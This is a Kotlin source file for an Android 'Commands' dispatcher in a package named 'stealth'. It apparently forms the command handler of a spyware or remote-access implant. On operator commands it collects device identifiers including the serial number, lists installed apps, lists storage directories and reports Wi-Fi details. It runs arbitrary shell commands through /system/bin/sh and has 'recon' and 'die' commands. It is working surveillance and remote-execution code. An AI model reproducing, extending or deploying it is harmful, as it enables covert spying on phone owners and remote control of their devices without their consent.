package com.kaze.stealth

import android.content.Context
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit

object Commands {

    fun dispatch(context: Context, command: String): String {
        val parts = command.split("|", limit = 2)
        val action = parts[0].trim()
        val arg = if (parts.size > 1) parts[1].trim() else ""

        if (!Config.ALLOWED_COMMANDS.contains(action)) {
            return "ERROR:UNKNOWN_COMMAND"
        }

        return when (action) {
            "info" -> deviceInfo()
            "apps" -> getApps(context)
            "shell" -> shell(arg)
            "battery" -> battery(context)
            "files" -> files(arg)
            "wifi" -> wifi(context)
            "recon" -> Recon.execute(context)
            "die" -> "DIE"
            else -> "ERROR:NO_HANDLER"
        }
    }

    private fun deviceInfo(): String {
        val sb = StringBuilder()
        sb.append("MANUFACTURER:").append(Build.MANUFACTURER).append("\n")
        sb.append("MODEL:").append(Build.MODEL).append("\n")
        sb.append("DEVICE:").append(Build.DEVICE).append("\n")
        sb.append("ANDROID:").append(Build.VERSION.RELEASE).append("\n")
        sb.append("SDK:").append(Build.VERSION.SDK_INT).append("\n")
        sb.append("BOARD:").append(Build.BOARD).append("\n")
        sb.append("HARDWARE:").append(Build.HARDWARE).append("\n")
        sb.append("PRODUCT:").append(Build.PRODUCT).append("\n")
        sb.append("DISPLAY:").append(Build.DISPLAY).append("\n")
        sb.append("SERIAL:").append(Build.SERIAL).append("\n")
        sb.append("BOOTLOADER:").append(Build.BOOTLOADER).append("\n")
        sb.append("HOST:").append(Build.HOST).append("\n")
        sb.append("TIME:").append(Build.TIME).append("\n")
        sb.append("TYPE:").append(Build.TYPE).append("\n")
        sb.append("TAGS:").append(Build.TAGS).append("\n")
        return sb.toString()
    }

    private fun getApps(context: Context): String {
        val sb = StringBuilder()
        for (app in context.packageManager.getInstalledApplications(0)) {
            val type = if (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0) "SYS" else "USR"
            val label = context.packageManager.getApplicationLabel(app).toString()
            sb.append(label).append("|").append(app.packageName).append("|").append(type).append("\n")
        }
        return sb.toString()
    }

    fun shell(cmd: String): String {
        if (cmd.isEmpty()) return "ERROR:EMPTY_COMMAND"
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("/system/bin/sh", "-c", cmd))
            val reader = BufferedReader(InputStreamReader(p.inputStream))
            val errReader = BufferedReader(InputStreamReader(p.errorStream))
            val sb = StringBuilder()
            var line: String?
            var totalSize = 0
            while (reader.readLine().also { line = it } != null) {
                val len = line!!.length
                if (totalSize + len > Config.MAX_SHELL_OUTPUT) {
                    sb.append("\n[OUTPUT TRUNCATED]\n")
                    break
                }
                sb.append(line).append("\n")
                totalSize += len
            }
            reader.close()
            if (!p.waitFor(30, TimeUnit.SECONDS)) {
                p.destroyForcibly()
                sb.append("\n[PROCESS TIMED OUT]\n")
            } else {
                while (errReader.readLine().also { line = it } != null) {
                    sb.append(line).append("\n")
                }
            }
            errReader.close()
            sb.toString()
        } catch (e: Exception) {
            "ERROR:${e.message}"
        }
    }

    private fun battery(context: Context): String {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
            val statusStr = when (status) {
                2 -> "CHARGING"
                5 -> "FULL"
                3 -> "DISCHARGING"
                else -> "UNKNOWN($status)"
            }
            val intent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val temp = intent?.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
            val voltage = intent?.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
            val sb = StringBuilder()
            sb.append("LEVEL:").append(level).append("%\n")
            sb.append("STATUS:").append(statusStr).append("\n")
            sb.append("TEMP:").append(temp / 10.0).append("C\n")
            sb.append("VOLTAGE:").append(voltage).append("mV\n")
            sb.toString()
        } catch (e: Exception) {
            "ERROR:${e.message}"
        }
    }

    private fun files(path: String): String {
        val dirPath = if (path.isEmpty()) {
            Environment.getExternalStorageDirectory().absolutePath
        } else {
            path
        }
        val sb = StringBuilder()
        val dir = File(dirPath)
        if (dir.exists() && dir.isDirectory) {
            val files = dir.listFiles()
            if (files != null) {
                var count = 0
                for (f in files) {
                    if (count >= Config.MAX_FILE_LIST) break
                    val prefix = if (f.isDirectory) "D:" else "F:"
                    sb.append(prefix).append(f.name).append("|").append(f.length()).append("\n")
                    count++
                }
            }
        }
        return sb.toString()
    }

    private fun wifi(context: Context): String {
        return try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val wi = wm.connectionInfo
            val sb = StringBuilder()
            sb.append("SSID:").append(wi.ssid).append("\n")
            sb.append("BSSID:").append(wi.bssid).append("\n")
            sb.append("SIGNAL:").append(wi.rssi).append("\n")
            sb.append("SPEED:").append(wi.linkSpeed).append("Mbps\n")
            val ip = wi.ipAddress
            sb.append("IP:")
                .append(ip and 0xFF).append(".")
                .append((ip shr 8) and 0xFF).append(".")
                .append((ip shr 16) and 0xFF).append(".")
                .append((ip shr 24) and 0xFF).append("\n")
            sb.toString()
        } catch (e: Exception) {
            "ERROR:${e.message}"
        }
    }
}
